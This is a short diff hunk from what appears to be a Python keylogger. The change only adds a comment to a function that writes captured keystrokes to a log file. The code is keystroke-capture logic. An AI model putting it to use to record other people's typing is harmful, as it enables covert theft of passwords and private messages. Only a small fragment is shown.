@@ -24,7 +24,7 @@ def on_press(key):
 def writefile(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            k=str(key).replace("'","")
+            k=str(key).replace("'","")# replacing the single quotes
             if(k.find("space")>0):
                 f.write("\n") #If number of "Key.space" occurences are more than 1 then the following keystrokes will be in a new line
             elif(k.find("Key")==-1):
